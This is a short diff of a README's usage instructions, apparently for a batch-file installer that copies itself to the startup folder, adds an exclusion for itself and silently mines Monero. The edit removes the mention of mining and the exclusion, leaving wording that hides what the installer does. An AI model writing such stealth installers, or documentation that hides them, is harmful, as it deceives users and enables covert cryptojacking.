@@ -2,4 +2,4 @@
 
 # Usage
 
-1. Run start.bat. The installer will copy itself to the startup folder, create an exclusion for it and will silently start mining Monero for you.
+ Run start.bat. The installer will copy itself to the startup folder.
